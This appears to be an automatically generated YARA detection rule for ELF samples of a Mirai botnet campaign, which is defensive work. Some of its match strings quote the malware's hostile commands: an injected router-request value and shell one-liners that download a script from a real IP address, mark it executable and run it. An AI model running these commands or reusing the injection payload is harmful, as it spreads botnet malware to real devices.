rule Sightlines_c2_d5dc8ccd_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-d5dc8ccd"
        date = "2026-10-24"
        campaign = "c2-d5dc8ccd"
        family = "mirai"
        hash = "1826b5c073569dba6d64db1bcd72c5777144e85464a30c72417ce19ece8103a2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-d5dc8ccd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget http://176.65.139.196/bi" ascii
        $s1 = "cd /tmp; wget http://176.65.139.196/bins/kla.sh -O k 2>/dev/null; chmod +x k 2>/dev/null; ./k" ascii
        $s2 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s3 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s6 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s7 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s8 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s9 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s10 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s11 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
